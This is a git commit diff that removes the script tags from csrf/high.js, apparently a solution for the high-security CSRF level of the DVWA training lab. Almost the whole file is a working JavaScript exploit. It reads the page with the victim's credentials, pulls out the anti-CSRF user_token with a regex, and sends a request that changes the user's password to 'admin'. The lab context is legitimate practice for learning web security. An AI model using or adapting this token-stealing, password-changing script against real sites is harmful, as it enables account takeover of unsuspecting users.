79a63af616c4c67b739cde8a42b6812bf32e7977
Daniel Platt <github@ofdan.co.uk>
2017-12-17 08:59:10 +0000

    Update high.js
    remove <script> tags

--- csrf/high.js
+++ csrf/high.js
@@ -1,33 +1,30 @@
-<script>
-    /**
-     * Author hd7exploit
-     */
-    var theUrl = 'http://127.0.0.1/dvwa/vulnerabilities/csrf/';
-    var pass = 'admin';
-    if (window.XMLHttpRequest){
-        xmlhttp=new XMLHttpRequest();
-    }else{
-        xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
-    }
-    xmlhttp.withCredentials = true;
-    var hacked = false;
-    xmlhttp.onreadystatechange=function(){
-        if (xmlhttp.readyState==4 && xmlhttp.status==200)
-        {
-            var text = xmlhttp.responseText;
-            var regex = /user_token\' value\=\'(.*?)\' \/\>/;
-            var match = text.match(regex);
-            var token = match[1];
-            var new_url = theUrl + '?user_token='+token+'&password_new='+pass+'&password_conf='+pass+'&Change=Change'
-            if(!hacked){
-                alert('Got token:' + match[1]);
-                hacked = true;
-                xmlhttp.open("GET", new_url, false );
-                xmlhttp.send();  
-            }
+/**
+ * Author hd7exploit
+ */
+var theUrl = 'http://127.0.0.1/dvwa/vulnerabilities/csrf/';
+var pass = 'admin';
+if (window.XMLHttpRequest){
+    xmlhttp=new XMLHttpRequest();
+}else{
+    xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
+}
+xmlhttp.withCredentials = true;
+var hacked = false;
+xmlhttp.onreadystatechange=function(){
+    if (xmlhttp.readyState==4 && xmlhttp.status==200)
+    {
+        var text = xmlhttp.responseText;
+        var regex = /user_token\' value\=\'(.*?)\' \/\>/;
+        var match = text.match(regex);
+        var token = match[1];
+        var new_url = theUrl + '?user_token='+token+'&password_new='+pass+'&password_conf='+pass+'&Change=Change'
+        if(!hacked){
+            alert('Got token:' + match[1]);
+            hacked = true;
+            xmlhttp.open("GET", new_url, false );
+            xmlhttp.send();  
         }
-    };
-    xmlhttp.open("GET", theUrl, false );
-    xmlhttp.send();  
-            
-</script>
+    }
+};
+xmlhttp.open("GET", theUrl, false );
+xmlhttp.send();
